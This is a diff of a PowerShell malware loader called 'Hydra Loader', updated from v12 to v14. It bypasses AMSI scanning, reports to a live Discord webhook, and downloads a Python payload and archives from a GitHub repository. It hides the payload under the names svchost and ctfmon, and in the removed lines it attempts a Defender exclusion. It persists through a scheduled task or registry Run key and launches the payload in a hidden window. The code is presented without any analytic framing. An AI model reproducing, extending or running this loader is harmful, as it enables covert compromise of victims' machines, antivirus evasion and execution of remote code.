@@ -1,52 +1,46 @@
-# --- THE SHADOW HYDRA LOADER (V12.0 - STABLE) ---
+# --- THE ETERNAL HYDRA LOADER (V14.0 - FULL LOCK-IN) ---
 # 0. BLIND THE WATCHDOG (AMSI BYPASS)
 $a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b.GetFields('NonPublic,Static');foreach($d in $c){if($d.Name -like "*Context"){$d.SetValue($null,$null)}}}}
 
 $WEBHOOK = "https://discord.com/api/webhooks/1505044718797586577/-gbKCGDVp0tz3RjJl3IfaTTU1xuu3ZBP4fmrL-jq_s0NbA_1iB8zFM0BURGTRTQcZg8U"
 function Send-Ghost { param($msg) try { $json = @{content="**[GHOST STATUS | $($env:COMPUTERNAME)]** $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }
 
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $ID = "svchost"
 $Path = "$env:APPDATA\$ID"
 $PY_MASK = "$Path\python\ctfmon.exe"
-$TASK_NAME = "MsCtfMonitorSystem"
 
-if (Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$Path*" }) { exit }
-if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }
+# 1. CLEANING OLD SKIN
+if (Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue) { Stop-Process -Name "ctfmon" -Force }
+if (!(Test-Path $Path)) { md $Path > $null }
 
-# 1. ATTEMPT DEFENDER EXCLUSION
-$currentId = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-if ($currentId.Groups -contains "S-1-5-32-544") {
-    Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
+# 2. LANDING THE HYDRA
+Send-Ghost "Evolution Triggered: Landing V14.0 Core Engine..."
+$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
+$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin"
+
+# Synchronous Land
+Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
+$zipPath = "$Path\mui_cache.zip"
+Invoke-WebRequest -Uri $Z_URL -OutFile $zipPath
+
+# Safe Extraction (Overwrite enabled)
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+$zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
+foreach ($entry in $zip.Entries) {
+    $target = [System.IO.Path]::Combine($Path, $entry.FullName)
+    if ($target.EndsWith("\")) { if (!(Test-Path $target)) { md $target > $null } }
+    else {
+        if (!(Test-Path ([System.IO.Path]::GetDirectoryName($target)))) { md ([System.IO.Path]::GetDirectoryName($target)) > $null }
+        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $target, $true)
+    }
 }
+$zip.Dispose()
+Remove-Item $zipPath -Force
 
-# 2. LANDING CORE & PAYLOADS
-if (!(Test-Path $PY_MASK)) {
-    Send-Ghost "Landing Private Engine..."
-    $zip = "$Path\py.zip"
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/py_core.zip" -OutFile $zip
-    if (!(Test-Path "$Path\python")) { New-Item -ItemType Directory -Path "$Path\python" -Force }
-    
-    # Use native tar if available, else .NET (more reliable than Expand-Archive)
-    Add-Type -AssemblyName System.IO.Compression.FileSystem
-    [System.IO.Compression.ZipFile]::ExtractToDirectory($zip, "$Path\python")
-    Remove-Item $zip -Force
-}
-
-Send-Ghost "Syncing Shadow Logic..."
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py" -OutFile "$Path\WinServices.py"
-$binZip = "$Path\mui_cache.zip"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin" -OutFile $binZip
-
-# Unzip payloads
-[System.IO.Compression.ZipFile]::ExtractToDirectory($binZip, $Path)
-Remove-Item $binZip -Force
-
-# 3. PERSISTENCE VIA SCHEDULED TASK
-$action = New-ScheduledTaskAction -Execute $PY_MASK -Argument "`"$Path\WinServices.py`""
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-Register-ScheduledTask -TaskName $TASK_NAME -Action $action -Trigger $trigger -RunLevel Highest -Force -ErrorAction SilentlyContinue
+# 3. PERSISTENCE (Registry Run Key - The Old Reliable)
+$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $RegPath -Name $ID -Value "`"$PY_MASK`" `"$Path\WinServices.py`""
 
 # 4. ENGAGE
 Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`"" -WorkingDirectory $Path -WindowStyle Hidden
-Send-Ghost "Hydra v12.0 Online. Deployment verified."
+Send-Ghost "The Eternal Hydra v14.0 is live. Shadow Protocol engaged."
